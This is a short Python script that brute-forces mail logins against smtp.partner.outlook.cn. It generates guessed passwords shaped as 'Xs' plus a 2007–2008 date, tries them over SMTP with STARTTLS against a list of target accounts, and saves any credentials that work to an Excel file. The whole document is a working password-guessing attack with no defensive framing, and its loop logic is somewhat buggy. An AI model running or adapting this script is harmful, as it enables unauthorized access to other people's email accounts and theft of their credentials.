attack_list=['']
from random import randint
import smtplib
from email.mime.text import MIMEText
import xlwt
import tkinter
import tkinter.messagebox
from email.header import Header
workbook = xlwt.Workbook(encoding = 'utf-8')
worksheet = workbook.add_sheet('sougou',cell_overwrite_ok=True)
s=0
def date(dm):
    if dm<10:
        dm='0'+str(dm)
    return str(dm)
pl=set()
style=xlwt.XFStyle()
font=xlwt.Font()
worksheet.bold=True
list_number=len(attack_list)
for j in range(list_number):
    target=attack_list[j-1]
    for i in range(2007,2009,1):
        for h in range(1,13):
            for q in range(1,32):
                password="Xs"+str(i)+date(h)+date(q)
                pl.add(password) 
pl=list(pl)
mail_host="smtp.partner.outlook.cn" 
for w in pl:
    mail_user=attack_list[s]
    print(attack_list[s],end =', ')
    print("tring password:",w)
    mail_pass=w
    smtp = smtplib.SMTP(mail_host, 25)
    smtp.connect(mail_host, 25)
    try:
        smtp.ehlo()
        smtp.starttls()
        print(smtp.login(mail_user,mail_pass) )
        worksheet.write(s,0, label = mail_user)
        worksheet.write(s,1, label = w)
        workbook.save('pass.xls')
        tkinter.messagebox.showinfo('message','saved!')
        if s+1>=list_number:
            break
        while s+1<list_number:
            s+=1
            continue
        
    except:
        print("incorrect")
        pass
